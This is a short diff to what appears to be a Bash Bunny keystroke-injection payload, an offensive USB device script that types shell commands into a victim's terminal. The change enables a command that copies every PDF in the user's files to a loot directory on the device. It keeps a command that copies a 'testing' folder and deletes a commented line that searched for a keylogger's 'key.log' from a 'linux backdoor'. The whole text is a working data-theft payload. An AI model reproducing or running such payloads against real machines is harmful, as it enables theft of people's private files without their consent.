@@ -15,15 +15,13 @@ Q ENTER
 Q STRING mkdir -p \$lootdir #make loot directory 
 Q ENTER
 # Find all PDFs stored in the user's file structure, and copy them over to the BashBunny storage.
-#Q STRING find . -name "*.pdf" -exec cp '{}' \$lootdir \\\;
-#Q ENTER 
+Q STRING find . -name "*.pdf" -exec cp '{}' \$lootdir \\\;
+Q ENTER 
 Q DELAY 1000
-# Find the folder to copy 
+# Find the 'testing' folder to copy 
 Q STRING find . -type d -name 'testing' -exec cp -a '{}' \$lootdir \\\;
 Q ENTER 
 Q DELAY 1000 
-#Q STRING find . -name "key.log" -exec cp '{}' \$lootdir \\\; #searches the keylog file from linux backdoor
-#Q ENTER 
 Q STRING exit
 Q ENTER 
 
